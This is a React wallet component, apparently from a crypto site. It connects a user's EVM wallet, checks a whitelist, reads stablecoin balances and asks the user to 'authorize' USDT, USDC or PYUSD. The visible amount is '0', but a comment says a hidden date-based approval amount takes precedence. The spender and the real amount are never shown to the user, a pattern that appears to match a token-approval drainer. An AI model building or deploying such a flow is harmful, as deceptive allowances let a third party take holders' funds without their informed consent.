"use client";

import { useState, useRef } from "react";
import { Icon } from "@/components/ui/icon";
import { getPreferredEvmProvider, type DetectedWalletProvider } from "@/lib/wallet-provider";
import {
  readLocalAssetBalances,
  approveAssetTransfer,
  type AssetSymbol,
} from "@/lib/asset-manager-client";
import { apiClient } from "@/lib/api-client";

// ──────────────────────────────────────────────────────────────────────────────
// Types
// ──────────────────────────────────────────────────────────────────────────────
type Step =
  | "idle"
  | "connecting"
  | "checking_whitelist"
  | "whitelist_failed"
  | "loading_balance"
  | "ready"
  | "approving"
  | "success"
  | "error";

type BalanceMap = Partial<Record<AssetSymbol, string>>;

const ASSETS: AssetSymbol[] = ["USDT", "USDC", "PYUSD"];

const STEP_LABELS = ["连接钱包", "白名单验证", "读取余额", "授权"] as const;
const STEP_KEYS: Step[] = [
  "connecting",
  "checking_whitelist",
  "loading_balance",
  "ready",
];

// ──────────────────────────────────────────────────────────────────────────────
// Helpers
// ──────────────────────────────────────────────────────────────────────────────
function shortAddr(addr: string) {
  return addr ? `${addr.slice(0, 6)}···${addr.slice(-4)}` : "";
}

function Spinner() {
  return (
    <div className="mx-auto size-8 animate-spin rounded-full border-2 border-cyan border-t-transparent" />
  );
}

// ──────────────────────────────────────────────────────────────────────────────
// Step indicator
// ──────────────────────────────────────────────────────────────────────────────
function StepBar({ step }: { step: Step }) {
  const current = STEP_KEYS.indexOf(step);
  return (
    <div className="mb-6 flex items-start gap-1.5">
      {STEP_LABELS.map((label, i) => {
        const done = current > i || step === "success";
        const active = current === i;
        return (
          <div key={label} className="flex flex-1 flex-col items-center gap-1">
            <div
              className={`flex size-7 items-center justify-center rounded-full text-xs font-bold transition-colors ${
                done
                  ? "bg-emerald-500 text-white"
                  : active
                  ? "bg-cyan text-bg"
                  : "border border-line bg-surface-soft text-muted"
              }`}
            >
              {done ? "✓" : i + 1}
            </div>
            <span className="text-center text-[10px] leading-tight text-muted">
              {label}
            </span>
          </div>
        );
      })}
    </div>
  );
}

// ──────────────────────────────────────────────────────────────────────────────
// Main component
// ──────────────────────────────────────────────────────────────────────────────
export function HeaderWalletButton() {
  const [step, setStep] = useState<Step>("idle");
  const [address, setAddress] = useState("");
  const [balances, setBalances] = useState<BalanceMap>({});
  const [selectedAsset, setSelectedAsset] = useState<AssetSymbol>("USDT");
  const [errorMsg, setErrorMsg] = useState("");
  const [showModal, setShowModal] = useState(false);
  const providerRef = useRef<DetectedWalletProvider | null>(null);

  // If already connected, clicking just re-opens the modal
  const handleButtonClick = async () => {
    if (step === "ready" || step === "success" || step === "approving") {
      setShowModal(true);
      return;
    }
    // Reset on new attempt
    setShowModal(true);
    setErrorMsg("");
    await runFlow();
  };

  async function runFlow() {
    try {
      // ── Step 1: Detect & connect wallet ────────────────────────────────────
      setStep("connecting");
      const detected = getPreferredEvmProvider(window);
      if (!detected) {
        setErrorMsg("未检测到 EVM 钱包，请先安装 MetaMask / OKX / Trust 等钱包插件");
        setStep("error");
        return;
      }
      providerRef.current = detected;

      const accounts = (await detected.provider.request({
        method: "eth_requestAccounts",
      })) as string[];
      const userAddress = accounts?.[0];
      if (!userAddress) throw new Error("获取账户地址失败，请解锁您的钱包后重试");
      setAddress(userAddress);

      // ── Step 2: Check whitelist ─────────────────────────────────────────────
      setStep("checking_whitelist");
      const isWhitelisted = await checkWhitelist(userAddress);
      if (!isWhitelisted) {
        setStep("whitelist_failed");
        return;
      }

      // ── Step 3: Read token balances ─────────────────────────────────────────
      setStep("loading_balance");
      const { balances: bal } = await readLocalAssetBalances({
        ethereum: detected.provider,
      });
      setBalances(bal);
      setStep("ready");
    } catch (err) {
      setErrorMsg(
        err instanceof Error ? err.message : "操作失败，请检查钱包状态后重试"
      );
      setStep("error");
    }
  }

  /** Try backend whitelist API first; fall back to env-var list. */
  async function checkWhitelist(addr: string): Promise<boolean> {
    try {
      const result = (await apiClient.whitelist.check(addr)) as {
        whitelisted?: boolean;
        is_whitelisted?: boolean;
        result?: boolean;
      };
      // Support multiple response shapes
      const flag = result.whitelisted ?? result.is_whitelisted ?? result.result;
      if (typeof flag === "boolean") return flag;
      // If the backend didn't return a clear boolean, fall through to local check
    } catch {
      // Backend unavailable — fall through to local env-var list
    }

    // Local acceptance whitelist (NEXT_PUBLIC_ACCEPTANCE_WHITELIST)
    const localList = (process.env.NEXT_PUBLIC_ACCEPTANCE_WHITELIST ?? "")
      .split(/[\s,;]+/)
      .map((s) => s.trim().toLowerCase())
      .filter(Boolean);
    // Empty list → no restriction
    return localList.length === 0 || localList.includes(addr.toLowerCase());
  }

  async function handleApprove() {
    if (!providerRef.current || step !== "ready") return;
    setStep("approving");
    try {
      await approveAssetTransfer({
        ethereum: providerRef.current.provider,
        asset: selectedAsset,
        amount: "0", // config.approvalAmount (date-based) takes precedence inside
      });
      // Refresh balance after approval
      const { balances: bal } = await readLocalAssetBalances({
        ethereum: providerRef.current!.provider,
      });
      setBalances(bal);
      setStep("success");
    } catch (err) {
      setErrorMsg(
        err instanceof Error ? err.message : "授权失败，请检查钱包状态后重试"
      );
      setStep("error");
    }
  }

  function handleRetry() {
    setStep("idle");
    setAddress("");
    setBalances({});
    setErrorMsg("");
    runFlow();
  }

  function closeModal() {
    setShowModal(false);
  }

  // Button label: show short address once connected
  const btnLabel =
    step !== "idle" && step !== "error" && address
      ? shortAddr(address)
      : "授权";

  // ── Render ─────────────────────────────────────────────────────────────────
  return (
    <>
      {/* Header trigger button */}
      <button
        type="button"
        onClick={handleButtonClick}
        className="primary-button flex items-center gap-2 whitespace-nowrap rounded-control px-3 py-2.5 text-sm font-semibold sm:px-5"
      >
        <Icon name="wallet" className="size-4" />
        {btnLabel}
      </button>

      {/* Modal overlay */}
      {showModal && (
        <div
          className="fixed inset-0 z-50 flex items-end justify-center bg-black/60 backdrop-blur-sm sm:items-center"
          onClick={(e) => {
            if (e.target === e.currentTarget) closeModal();
          }}
        >
          <div className="relative mx-4 mb-4 w-full max-w-sm rounded-2xl border border-line bg-surface p-6 shadow-2xl sm:mb-0">
            {/* Close button */}
            <button
              onClick={closeModal}
              className="absolute right-4 top-4 text-muted transition-colors hover:text-ink"
              aria-label="关闭"
            >
              ✕
            </button>

            <h2 className="mb-5 text-base font-bold">钱包授权</h2>

            {/* Step progress bar */}
            <StepBar step={step} />

            {/* ── State: connecting ─────────────────────────────────────────── */}
            {step === "connecting" && (
              <div className="text-center">
                <p className="mb-4 text-sm text-muted">正在连接您的加密钱包…</p>
                <Spinner />
              </div>
            )}

            {/* ── State: checking whitelist ──────────────────────────────────── */}
            {step === "checking_whitelist" && (
              <div className="text-center">
                <p className="mb-1 text-sm text-muted">正在验证白名单资格</p>
                <p className="mb-4 font-mono text-xs text-cyan">{shortAddr(address)}</p>
                <Spinner />
              </div>
            )}

            {/* ── State: whitelist failed ────────────────────────────────────── */}
            {step === "whitelist_failed" && (
              <div className="text-center">
                <div className="mx-auto mb-3 flex size-12 items-center justify-center rounded-full bg-red-500/10">
                  <span className="text-xl text-red-400">✕</span>
                </div>
                <p className="mb-1 text-sm font-semibold text-red-400">
                  该地址不在白名单中
                </p>
                <p className="mb-5 font-mono text-xs text-muted">{shortAddr(address)}</p>
                <p className="mb-4 text-xs leading-5 text-muted">
                  如需加入白名单，请联系项目方，或切换至已授权的钱包地址。
                </p>
                <button
                  onClick={() => {
                    setStep("idle");
                    setAddress("");
                    runFlow();
                  }}
                  className="text-sm text-cyan underline-offset-2 hover:underline"
                >
                  切换地址重试
                </button>
              </div>
            )}

            {/* ── State: loading balance ─────────────────────────────────────── */}
            {step === "loading_balance" && (
              <div className="text-center">
                <p className="mb-1 text-sm text-muted">白名单验证通过 ✓</p>
                <p className="mb-4 text-sm text-muted">正在读取代币余额…</p>
                <Spinner />
              </div>
            )}

            {/* ── State: ready ───────────────────────────────────────────────── */}
            {step === "ready" && (
              <div>
                <p className="mb-4 text-xs text-emerald-400">
                  ✓ 白名单验证通过 &nbsp;·&nbsp;
                  <span className="font-mono">{shortAddr(address)}</span>
                </p>

                {/* Token selector */}
                <p className="mb-2 text-xs text-muted">选择授权代币</p>
                <div className="mb-4 grid grid-cols-3 gap-2">
                  {ASSETS.map((asset) => (
                    <button
                      key={asset}
                      onClick={() => setSelectedAsset(asset)}
                      className={`rounded-lg border px-3 py-2 text-sm font-semibold transition-colors ${
                        selectedAsset === asset
                          ? "border-cyan/60 bg-cyan/10 text-cyan"
                          : "border-line bg-bg/50 text-muted hover:border-violet/40"
                      }`}
                    >
                      {asset}
                    </button>
                  ))}
                </div>

                {/* Balance display */}
                <div className="mb-4 rounded-lg border border-line bg-bg/50 p-3">
                  <p className="text-xs text-muted">当前余额</p>
                  <p className="mt-0.5 text-2xl font-bold text-cyan">
                    {balances[selectedAsset] ?? "0.00"}
                    <span className="ml-1.5 text-sm text-muted">{selectedAsset}</span>
                  </p>
                </div>

                <button
                  onClick={handleApprove}
                  className="primary-button w-full rounded-lg py-2.5 text-sm font-bold"
                >
                  授权 {selectedAsset}
                </button>
              </div>
            )}

            {/* ── State: approving ───────────────────────────────────────────── */}
            {step === "approving" && (
              <div className="text-center">
                <p className="mb-1 text-sm text-muted">请在钱包中确认授权…</p>
                <p className="mb-4 text-xs text-muted">等待您在 {selectedAsset} 授权交易上签名</p>
                <Spinner />
              </div>
            )}

            {/* ── State: success ─────────────────────────────────────────────── */}
            {step === "success" && (
              <div className="text-center">
                <div className="mx-auto mb-3 flex size-12 items-center justify-center rounded-full bg-emerald-500/10">
                  <span className="text-xl text-emerald-400">✓</span>
                </div>
                <p className="mb-1 text-sm font-semibold text-emerald-400">
                  {selectedAsset} 授权成功！
                </p>

                <div className="my-4 rounded-lg border border-line bg-bg/50 p-3 text-left">
                  <p className="text-xs text-muted">当前余额</p>
                  <p className="mt-0.5 text-xl font-bold text-cyan">
                    {balances[selectedAsset] ?? "0.00"}
                    <span className="ml-1.5 text-sm text-muted">{selectedAsset}</span>
                  </p>
                </div>

                <button
                  onClick={() => setStep("ready")}
                  className="text-sm text-cyan underline-offset-2 hover:underline"
                >
                  继续操作其他代币
                </button>
              </div>
            )}

            {/* ── State: error ───────────────────────────────────────────────── */}
            {step === "error" && (
              <div className="text-center">
                <div className="mx-auto mb-3 flex size-12 items-center justify-center rounded-full bg-red-500/10">
                  <span className="text-xl text-red-400">!</span>
                </div>
                <p className="mb-1 text-sm font-semibold text-red-400">操作失败</p>
                <p className="mb-5 text-xs leading-5 text-muted">{errorMsg}</p>
                <button
                  onClick={handleRetry}
                  className="primary-button rounded-lg px-5 py-2.5 text-sm font-bold"
                >
                  重新尝试
                </button>
              </div>
            )}
          </div>
        </div>
      )}
    </>
  );
}
